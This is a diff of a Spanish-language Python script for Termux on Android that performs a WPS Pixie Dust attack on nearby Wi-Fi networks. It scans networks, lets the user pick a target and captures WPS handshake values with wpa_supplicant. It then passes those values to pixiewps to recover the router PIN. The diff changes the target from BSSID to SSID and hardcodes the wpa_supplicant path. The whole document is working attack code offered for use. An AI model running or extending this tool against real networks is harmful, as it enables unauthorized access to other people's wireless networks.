@@ -53,11 +53,11 @@ def scan_wifi(interface):
                 continue
     return redes, bssids, canales
 
-def create_wpa_supplicant_conf(bssid):
+def create_wpa_supplicant_conf(ssid):
     """Crea un archivo de configuración temporal para wpa_supplicant"""
     conf_content = f"""
 network={{
-    ssid="{bssid}"
+    ssid="{ssid}"
     key_mgmt=NONE
 }}
 """
@@ -66,11 +66,12 @@ network={{
     conf_file.close()
     return conf_file.name
 
-def capture_wps_data(interface, bssid):
+def capture_wps_data(interface, ssid):
     """Captura los datos necesarios para el ataque Pixie Dust usando wpa_supplicant"""
-    print(f"Capturando datos WPS de la red con BSSID {bssid}...")
-    conf_file = create_wpa_supplicant_conf(bssid)
-    wpa_supplicant_command = f"wpa_supplicant -i {interface} -c {conf_file} -dd"
+    print(f"Capturando datos WPS de la red con SSID {ssid}...")
+    conf_file = create_wpa_supplicant_conf(ssid)
+    wpa_supplicant_path = "/data/data/com.termux/files/usr/bin/wpa_supplicant"  # Ruta completa de wpa_supplicant
+    wpa_supplicant_command = f"{wpa_supplicant_path} -i {interface} -c {conf_file} -dd"
     stdout, stderr = run_command(wpa_supplicant_command, use_sudo=True)
 
     pke = extract_value(stdout, "PKE:")
@@ -88,12 +89,12 @@ def capture_wps_data(interface, bssid):
 
     return pke, pkr, ehash1, ehash2, authkey, enonce
 
-def perform_pixie_dust_attack(interface, bssid):
+def perform_pixie_dust_attack(interface, ssid):
     """Realiza el ataque Pixie Dust usando pixiewps."""
-    print(f"\nIniciando ataque Pixie Dust en BSSID: {bssid}")
+    print(f"\nIniciando ataque Pixie Dust en SSID: {ssid}")
 
     # Capturar los datos necesarios usando wpa_supplicant
-    pke, pkr, ehash1, ehash2, authkey, enonce = capture_wps_data(interface, bssid)
+    pke, pkr, ehash1, ehash2, authkey, enonce = capture_wps_data(interface, ssid)
     if not all([pke, pkr, ehash1, ehash2, authkey, enonce]):
         print("No se pudieron capturar los datos necesarios para el ataque Pixie Dust.")
         return
@@ -118,7 +119,7 @@ def perform_pixie_dust_attack(interface, bssid):
 
 def main():
     # Verificar la disponibilidad de las herramientas necesarias
-    tools = ["iw", "pixiewps", "wpa_supplicant"]
+    tools = ["iw", "pixiewps", "/data/data/com.termux/files/usr/bin/wpa_supplicant"]
     for tool in tools:
         if not check_tool_availability(tool):
             return
@@ -129,7 +130,7 @@ def main():
     if redes:
         print("Redes disponibles:")
         for i, red in enumerate(redes):
-            print(f"{i + 1}. {red}")
+            print(f"{i + 1}. {red} - BSSID: {bssids[i]}")
         
         seleccion = int(input("Selecciona la red que deseas auditar (número): ")) - 1
         red_seleccionada = redes[seleccion]
@@ -144,7 +145,7 @@ def main():
         print(f"Canal: {canal_seleccionado}")
         
         # Realizar el ataque Pixie Dust utilizando la interfaz del hotspot
-        perform_pixie_dust_attack(hotspot_interface, bssid_seleccionado)
+        perform_pixie_dust_attack(hotspot_interface, red_seleccionada)
     else:
         print("No se encontraron redes WiFi.")
 
